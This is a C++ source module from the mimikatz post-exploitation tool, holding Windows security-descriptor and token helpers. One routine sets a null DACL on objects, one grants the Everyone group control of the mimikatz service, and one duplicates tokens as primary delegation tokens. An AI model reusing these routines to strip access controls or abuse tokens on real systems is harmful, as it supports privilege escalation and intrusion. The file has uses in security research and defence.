/*	Benjamin DELPY `gentilkiwi`
	http://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : http://creativecommons.org/licenses/by/3.0/fr/
*/
#include "mod_secacl.h"

bool mod_secacl::nullSdToHandle(PHANDLE monHandle, SE_OBJECT_TYPE monType)
{
	PSECURITY_DESCRIPTOR newSD = NULL;
	ULONG laTaille;
	bool succes = false;

	if(BuildSecurityDescriptor(NULL, NULL, 0, NULL, 0, NULL, NULL, &laTaille, &newSD) == ERROR_SUCCESS)
	{
		switch(monType)
		{
		case SE_KERNEL_OBJECT:
			succes = SetKernelObjectSecurity(*monHandle, DACL_SECURITY_INFORMATION, newSD) != 0;
			break;
		case SE_SERVICE:
			succes = SetServiceObjectSecurity(*reinterpret_cast<SC_HANDLE *>(monHandle), DACL_SECURITY_INFORMATION, newSD) != 0;
			break;
		}
		LocalFree(newSD);
	}

	return succes;
}

bool mod_secacl::addWorldToMimikatz(SC_HANDLE * monHandle)
{
	bool reussite = false;
	DWORD dwSizeNeeded = 0;
	SECURITY_DESCRIPTOR monSd;
	if((QueryServiceObjectSecurity(*monHandle, DACL_SECURITY_INFORMATION, &monSd, 0, &dwSizeNeeded) == 0) && (GetLastError() == ERROR_INSUFFICIENT_BUFFER))
	{
		PSECURITY_DESCRIPTOR oldSd = new BYTE[dwSizeNeeded];
		if(QueryServiceObjectSecurity(*monHandle, DACL_SECURITY_INFORMATION, oldSd, dwSizeNeeded, &dwSizeNeeded))
		{
			SID_IDENTIFIER_AUTHORITY SIDAuthWorld = SECURITY_WORLD_SID_AUTHORITY;
			PSID pEveryoneSID = NULL;
			if(AllocateAndInitializeSid(&SIDAuthWorld, 1, SECURITY_WORLD_RID, 0, 0, 0, 0, 0, 0, 0, &pEveryoneSID))
			{
				EXPLICIT_ACCESS ForEveryOne;
				RtlZeroMemory(&ForEveryOne, sizeof(EXPLICIT_ACCESS));
				ForEveryOne.grfAccessMode = SET_ACCESS;
				ForEveryOne.grfInheritance = NO_INHERITANCE;
				ForEveryOne.grfAccessPermissions = SERVICE_QUERY_STATUS | SERVICE_QUERY_CONFIG | SERVICE_INTERROGATE | SERVICE_ENUMERATE_DEPENDENTS | SERVICE_PAUSE_CONTINUE | SERVICE_START | SERVICE_STOP | SERVICE_USER_DEFINED_CONTROL | READ_CONTROL ;
				ForEveryOne.Trustee.TrusteeForm = TRUSTEE_IS_SID;
				ForEveryOne.Trustee.TrusteeType = TRUSTEE_IS_WELL_KNOWN_GROUP;
				ForEveryOne.Trustee.ptstrName = reinterpret_cast<LPTSTR>(pEveryoneSID);
						
				PSECURITY_DESCRIPTOR newSd = NULL;
				DWORD laTaille;
				if(BuildSecurityDescriptor(NULL, NULL, 1, &ForEveryOne, 0, NULL, oldSd, &laTaille, &newSd) == ERROR_SUCCESS)
				{
					reussite = SetServiceObjectSecurity(*monHandle, DACL_SECURITY_INFORMATION, newSd) != 0;
					LocalFree(newSd);
				}
				FreeSid(pEveryoneSID);
			}
		}
		delete [] oldSd;
	}
	return reussite;
}

bool mod_secacl::sidToStrSid(PSID Sid, wstring * strSid)
{
	bool reussite = false;
	
	wchar_t * szSid;
	if(reussite = ConvertSidToStringSid(Sid, &szSid) != 0)
	{
		strSid->assign(szSid);
		LocalFree(szSid);
	}
	return reussite;
}

bool mod_secacl::sidToName(PSID Sid, wstring * strName, wstring * domainName, wstring * systemName, SID_NAME_USE * usage)
{
	bool reussite = false;
	
	DWORD dwSizeName = 0;
	DWORD dwSizeDomain = 0;
	SID_NAME_USE nameUse;
	
	if(!LookupAccountSid((systemName ? systemName->c_str() : NULL), Sid, NULL, &dwSizeName, NULL, &dwSizeDomain, &nameUse) && (GetLastError() == ERROR_INSUFFICIENT_BUFFER))
	{
		wchar_t * monNom = new wchar_t[dwSizeName];
		wchar_t * monDomain = new wchar_t[dwSizeDomain];
		if(reussite = (LookupAccountSid((systemName ? systemName->c_str() : NULL), Sid, monNom, &dwSizeName, monDomain, &dwSizeDomain, &nameUse)) != 0)
		{
			strName->assign(monNom);
			if(domainName)
				domainName->assign(monDomain);

			if(usage)
				*usage = nameUse;
		}
		delete[] monDomain;
		delete[] monNom;
	}

	return reussite;
}

bool mod_secacl::simpleSidToString(PSID Sid, wstring * String)
{
	wstring userName;
	wstring domaineName;
	String->clear();

	if(Sid)
	{
		if(mod_secacl::sidToName(Sid, &userName, &domaineName))
		{
			String->assign(domaineName);
			String->push_back(L'\\');
			String->append(userName);
		}
		else
			mod_secacl::sidToStrSid(Sid, String);
	}
	if(String->empty())
		String->assign(L"(null)");

	return true;
}

bool mod_secacl::tokenUser(HANDLE tokenHandle, wstring * strName, wstring * domainName, wstring * systemName, SID_NAME_USE * usage)
{
	bool reussite = false;

	DWORD szNeeded = 0;
	if(!GetTokenInformation(tokenHandle, TokenUser, NULL, 0, &szNeeded) && (GetLastError() == ERROR_INSUFFICIENT_BUFFER))
	{
		BYTE * mesDonnees = new BYTE[szNeeded];
		if(GetTokenInformation(tokenHandle, TokenUser, mesDonnees, szNeeded, &szNeeded))
		{
			TOKEN_USER * monUser = reinterpret_cast<TOKEN_USER *>(mesDonnees);
			reussite = sidToName(monUser->User.Sid, strName, domainName, systemName, usage);
		}
		delete[] mesDonnees;
	}

	return reussite;
}

bool mod_secacl::exchangeDupToken(HANDLE * tokenHandle)
{
	bool reussite = false;
	HANDLE secToken;
	if(reussite = DuplicateTokenEx(*tokenHandle, MAXIMUM_ALLOWED, NULL, /*SecurityImpersonation*/SecurityDelegation, /*TokenImpersonation*/ TokenPrimary, &secToken) != 0)
	{
		CloseHandle(*tokenHandle);
		*tokenHandle = secToken;
	}
	return reussite;
}